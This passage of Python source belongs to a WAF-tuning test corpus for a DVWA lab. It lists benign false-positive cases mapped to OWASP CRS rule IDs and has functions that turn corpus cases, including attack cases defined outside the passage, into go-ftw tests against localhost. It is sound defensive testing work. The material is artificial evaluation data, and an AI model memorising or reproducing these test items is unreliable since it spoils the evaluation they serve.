        _benign("hostname", "POST", "/vulnerabilities/exec/", "ARGS", "ip", "localhost", "localhost", ["932100"], "rce", exec_lab),
        _benign("windows-path", "POST", "/support", "ARGS", "message", r"C:\Users\Public\report.txt", r"C:\Users\Public\report.txt", ["930100"], "lfi", support),
        _benign("windows-docs", "POST", "/support", "ARGS", "message", r"See C:\Program Files\App\readme.txt", r"C:\Program Files\App\readme.txt", ["930100"], "lfi", support),
        _benign("unix-home-docs", "POST", "/support", "ARGS", "message", "config lives in /home/amish/projects/notes.txt", "/home/amish/projects/notes.txt", ["930120"], "lfi", support),
        _benign("relative-url", "POST", "/bookmarks", "ARGS", "url", "https://example.test/a/../b", "https://example.test/a/../b", ["931130", "930110"], "rfi", bookmarks),
        _benign("docs-parent-path", "POST", "/docs/search", "ARGS", "q", "what does ../ mean in a url path", "../ mean in a url path", ["930100"], "lfi", docs),
        _benign("etc-passwd-docs", "POST", "/docs/search", "ARGS", "q", "why attackers request /etc/passwd in tutorials", "/etc/passwd in tutorials", ["930120"], "lfi", docs),
        _benign("login-special-password", "POST", "/login.php", "ARGS", "password", r"P@ssw0rd!#$", r"P@ssw0rd!#$", ["942100"], "sqli", login),
        _benign("login-admin-user", "POST", "/login.php", "ARGS", "username", "admin", "admin", ["942100"], "sqli", login),
        _benign("security-low", "POST", "/security.php", "ARGS", "security", "low", "low", ["920273"], "protocol", security),
        _benign("fi-include-home", "GET", "/vulnerabilities/fi/", "ARGS", "page", "include.php", "include.php", ["930120"], "lfi", fi_lab),
        _benign("guestbook-name", "POST", "/vulnerabilities/xss_s/", "ARGS", "txtName", "reviewer", "reviewer", ["941100"], "xss", xss_s),
        _benign("sqli-lab-numeric", "GET", "/vulnerabilities/sqli/", "ARGS", "id", "1", "1", ["942100"], "sqli", sqli_lab),
        _benign("json-select-key", "POST", "/articles", "ARGS", "body", '{"title":"select committee minutes"}', "select committee minutes", ["942100"], "sqli", articles),
        _benign("css-expression-docs", "POST", "/docs/search", "ARGS", "q", "css expression() is deprecated in ie docs", "css expression()", ["941160"], "xss", docs),
        _benign("alert-docs", "POST", "/docs/search", "ARGS", "q", "javascript alert dialog in the style guide", "javascript alert dialog", ["941110"], "xss", docs),
        _benign("onerror-docs", "POST", "/docs/search", "ARGS", "q", "img onerror handler explained for students", "img onerror handler explained", ["941120"], "xss", docs),
        _benign("union-station", "GET", "/catalog/search", "ARGS", "q", "union station tote bag", "union station tote bag", ["942190"], "sqli", search),
        _benign("select-committee", "GET", "/catalog/search", "ARGS", "q", "select committee report hardcover", "select committee report hardcover", ["942100"], "sqli", search),
        _benign("drop-earrings", "GET", "/catalog/search", "ARGS", "q", "drop earrings gold plated", "drop earrings gold plated", ["942360"], "sqli", search),
        _benign("exec-summary", "POST", "/docs/search", "ARGS", "q", "executive summary template", "executive summary template", ["932150"], "rce", docs),
        _benign("cmd-palette", "POST", "/docs/search", "ARGS", "q", "open the command palette with ctrl shift p", "command palette", ["932110"], "rce", docs),
        _benign("null-chapter", "POST", "/docs/search", "ARGS", "q", "chapter 0: null values in sql", "null values in sql", ["920270"], "protocol", docs),
        _benign("percent-encoding-docs", "POST", "/docs/search", "ARGS", "q", "why urls use %2f for slashes", "%2f for slashes", ["930110"], "lfi", docs),
        _benign("localhost-docs", "POST", "/docs/search", "ARGS", "q", "bind the server to localhost during development", "localhost during development", ["920350"], "protocol", docs),
        _benign("user-agent-chrome", "GET", "/index.php", "REQUEST_HEADERS", "User-Agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/128.0.0.0", "Mozilla/5.0", ["913100"], "scanner", _route("/index.php", ["GET"], {}, "DVWA home"), notes="ordinary browser UA"),
        _benign("json-ampersand", "POST", "/customers", "ARGS", "name", "Smith & Jones LLC", "Smith & Jones LLC", ["942100"], "sqli", customers),
        _benign("email-plus", "POST", "/customers", "ARGS", "name", "Ada Lovelace", "Ada Lovelace", ["942100"], "sqli", customers),
        _benign("version-sql", "POST", "/docs/search", "ARGS", "q", "postgresql version() function in the manual", "version() function in the manual", ["942100"], "sqli", docs),
        _benign("wait-for-docs", "POST", "/docs/search", "ARGS", "q", "wait for delay in the deployment runbook", "wait for delay in the deployment runbook", ["942160"], "sqli", docs),
        _benign("passwd-phrase", "POST", "/support", "ARGS", "message", "please reset the password on my account", "reset the password on my account", ["930120"], "lfi", support),
        _benign("script-kiddie-docs", "POST", "/docs/search", "ARGS", "q", "history of the script tag in html4", "script tag in html4", ["941110"], "xss", docs),
        _benign("svg-logo", "POST", "/articles", "ARGS", "body", '<img src="/brand.svg" alt="brand">', "/brand.svg", ["941110"], "xss", articles),
        _benign("confirm-attendance", "POST", "/support", "ARGS", "message", "please confirm attendance for Friday", "confirm attendance", ["941110"], "xss", support),
        _benign("eval-coursework", "POST", "/docs/search", "ARGS", "q", "teacher eval form for the coursework", "teacher eval form", ["933150"], "php", docs),
        _benign("include-header", "POST", "/docs/search", "ARGS", "q", "include a header on every page of the report", "include a header on every page", ["933130"], "php", docs),
        _benign("system-design", "POST", "/docs/search", "ARGS", "q", "system design interview notes", "system design interview notes", ["933150"], "php", docs),
        _benign("file-include-readme", "GET", "/vulnerabilities/fi/", "ARGS", "page", "readme", "readme", ["930120"], "lfi", fi_lab),
        _benign("ping-hostname-docs", "POST", "/docs/search", "ARGS", "q", "ping hostname to check dns in the runbook", "ping hostname to check dns", ["932100"], "rce", docs),
        _benign("or-conjunction", "GET", "/catalog/search", "ARGS", "q", "cotton or linen shirts", "cotton or linen shirts", ["942130"], "sqli", search),
        _benign("in-stock", "GET", "/catalog/search", "ARGS", "q", "in stock navy jacket", "in stock navy jacket", ["942100"], "sqli", search),
        _benign("like-this", "GET", "/catalog/search", "ARGS", "q", "more items like this tote", "like this tote", ["942100"], "sqli", search),
        _benign("between-sizes", "GET", "/catalog/search", "ARGS", "q", "shoes between size 8 and 10", "between size 8 and 10", ["942100"], "sqli", search),
        _benign("not-null-docs", "POST", "/docs/search", "ARGS", "q", "not null constraint in the sql primer", "not null constraint", ["942100"], "sqli", docs),
        _benign("create-account-copy", "POST", "/articles", "ARGS", "body", "<p>Create your account to continue.</p>", "Create your account", ["941160"], "xss", articles),
        _benign("bash-tutorial-and", "POST", "/docs/search", "ARGS", "q", "using && in bash to chain commands in the tutorial", "&& in bash to chain commands", ["932100"], "rce", docs),
        _benign("backslash-windows-docs", "POST", "/support", "ARGS", "message", r"path uses backslash like C:\Temp\out.csv", r"C:\Temp\out.csv", ["930100"], "lfi", support),
        _benign("dotdot-explanation", "POST", "/docs/search", "ARGS", "q", "relative paths may contain .. segments when normalizing", ".. segments when normalizing", ["930100"], "lfi", docs),
        _benign("http-example-url", "POST", "/bookmarks", "ARGS", "url", "https://example.test/docs/sql/select.html", "https://example.test/docs/sql/select.html", ["931130", "942100"], "rfi", bookmarks),
        _benign("cookie-theme", "GET", "/index.php", "REQUEST_COOKIES", "theme", "dark", "dark", ["942100"], "sqli", _route("/index.php", ["GET"], {"theme": "ui theme cookie"}, "DVWA home")),
        _benign("q-select-course", "GET", "/catalog/search", "ARGS", "q", "select course notebook", "select course notebook", ["942100"], "sqli", search),
        _benign("union-made", "GET", "/catalog/search", "ARGS", "q", "union made denim jacket", "union made denim jacket", ["942190"], "sqli", search),
        _benign("exec-board", "POST", "/docs/search", "ARGS", "q", "exec board meeting minutes", "exec board meeting minutes", ["932150"], "rce", docs),
        _benign("id-parameter-name", "GET", "/catalog/search", "ARGS", "q", "product id labels for the warehouse", "product id labels", ["932105"], "rce", search),
        _benign("passwd-reset-ticket", "POST", "/support", "ARGS", "message", "passwd reset completed for the finance user", "passwd reset completed", ["930120"], "lfi", support),
        _benign("xml-update-docs", "POST", "/docs/search", "ARGS", "q", "how to update xml invoices in the handbook", "update xml invoices", ["942100"], "sqli", docs),
        _benign("concat-names", "POST", "/customers", "ARGS", "name", "Mary-Jane O'Connor-Smith", "O'Connor-Smith", ["942100"], "sqli", customers),
        _benign("html-ul", "POST", "/articles", "ARGS", "body", "<ul><li>first</li><li>second</li></ul>", "<ul><li>first</li>", ["941160"], "xss", articles),
        _benign("dvwa-login-get", "GET", "/login.php", "ARGS", "username", "", "", ["920300"], "protocol", login),
    ]
    return rows


def all_cases() -> list[CorpusCase]:
    cases = (
        sqli_attacks()
        + xss_attacks()
        + rce_attacks()
        + lfi_attacks()
        + rfi_php_protocol_misc()
        + benign_cases()
    )
    seen: set[str] = set()
    unique: list[CorpusCase] = []
    for case in cases:
        if case.id in seen:
            raise ValueError(f"duplicate corpus id: {case.id}")
        seen.add(case.id)
        unique.append(case)
    return unique


def to_request_record(case: CorpusCase) -> dict[str, Any]:
    return {
        "id": case.id,
        "label": case.label,
        "category": case.category,
        "method": case.method,
        "path": case.path,
        "collection": case.collection,
        "parameter": case.parameter,
        "payload": case.payload,
        "crs_rule_ids": list(case.crs_rule_ids),
        "headers": dict(case.headers),
        "notes": case.notes,
    }


def to_ftw_tests(cases: list[CorpusCase] | None = None) -> dict[str, Any]:
    """CRS/go-ftw-style document covering attack requests."""
    cases = cases or [case for case in all_cases() if case.label == "attack"]
    tests = []
    for index, case in enumerate(cases, start=1):
        uri = case.path
        if case.method == "GET" and case.parameter and case.payload:
            from urllib.parse import urlencode

            uri = f"{case.path}?{urlencode({case.parameter: case.payload})}"
        headers = {"Host": "localhost", "User-Agent": "waf-tuner-eval", **case.headers}
        stage: dict[str, Any] = {
            "input": {
                "dest_addr": "127.0.0.1",
                "port": 8080,
                "method": case.method,
                "uri": uri,
                "headers": headers,
                "stop_magic": True,
            },
            "output": {
                "status": [200, 403, 404, 406, 501],
                "log": {"expect_ids": [int(rule) for rule in case.crs_rule_ids if rule.isdigit()]},
            },
        }
        if case.method != "GET" and case.parameter and case.payload:
            stage["input"]["data"] = f"{case.parameter}={case.payload}"
            stage["input"]["headers"]["Content-Type"] = "application/x-www-form-urlencoded"
        tests.append({"test_title": case.id, "stages": [stage], "rule_id": index})
    return {
        "meta": {
            "author": "waf-tuner",
            "enabled": True,
            "name": "waf-tuner-eval.yaml",
            "description": "CRS-category attack requests for the DVWA lab",
        },
        "tests": tests,
    }
